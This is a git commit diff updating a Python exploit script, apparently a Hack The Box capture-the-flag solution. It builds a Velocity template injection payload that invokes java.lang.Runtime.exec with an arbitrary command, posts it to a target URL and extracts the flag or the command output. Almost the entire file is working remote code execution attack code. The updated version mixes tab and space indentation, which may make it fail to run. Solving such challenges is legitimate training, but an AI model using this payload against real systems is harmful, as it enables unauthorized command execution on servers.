b766acfdd5ee994c0f268673f39f6d0e782b898c
BOI1000 <97549749+BOI1000@users.noreply.github.com>
2025-07-15 11:44:57 -0600

    Update Aliens_are_painfull.py
    Small update

--- HTB_CTF/Aliens_are_painfull.py
+++ HTB_CTF/Aliens_are_painfull.py
@@ -5,37 +5,36 @@ import sys
 import re
 
 def Main(url, command="cat ../flag.txt"):
-    payload = f"""#set($x='')##
+	payload = f"""#set($x='')##
 #set($rt=$x.class.forName('java.lang.Runtime'))##
 #set($chr=$x.class.forName('java.lang.Character'))##
 #set($str=$x.class.forName('java.lang.String'))##
-
 #set($ex=$rt.getRuntime().exec('{command}'))##
 $ex.waitFor()
 #set($out=$ex.getInputStream())##
 #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end"""
+	headers = {"Content-Type": "application/x-www-form-urlencoded"}
+	a_payload = urllib.parse.quote(payload, safe='')
 
-    headers = {"Content-Type": "applcation/x-www-form-urlencoded"}
-    a_payload = urllib.parse.quote(payload, safe='')
-
-    try:
-        response = requests.post(url + "/?text=" + a_payload, headers=headers)
-        flag = re.search(r"HTB\{.*?\}", response.text)
-        if command != "cat ../flag.txt":
-            return response.text
-        return flag.group()
-    except requests.exceptions.RequestException as e:
-        print("[-] Error:", e)
-    return None
+	try:
+		response = requests.post(url + "/?text=" + a_payload, headers=headers)
+		flag = re.search(r"HTB\{.*?\}", response.text)
+		if command != "cat ../flag.txt":
+			o = re.search(r'^0\s*\n(.*)', response.text, re.MULTILINE)
+			return o.group(1) if o else None
+		return flag.group() if flag else None
+	except requests.exceptions.RequestException as e:
+		print("[-] Error:", e)
+        return None
 
 if __name__ == "__main__":
-    if len(sys.argv) > 3 or len(sys.argv) < 2:
-        print("Usage:", sys.argv[0], "[url] [command]")
-        sys.exit()
-    
-    url = sys.argv[1].rstrip("/")
-    if len(sys.argv) == 3:
-        command = sys.argv[2]
-        print("[+] Flag:", Main(url, command))
-    else:
-        print("[+] Flag:", Main(url))
+	if len(sys.argv) > 3 or len(sys.argv) < 2:
+		print("Usage:", sys.argv[0], "[url] [command]")
+		sys.exit()
+
+	url = sys.argv[1].rstrip("/")
+	if len(sys.argv) == 3:
+		command = sys.argv[2]
+		print("[+] Command:", Main(url, command))
+	else:
+		print("[+] Flag:", Main(url))
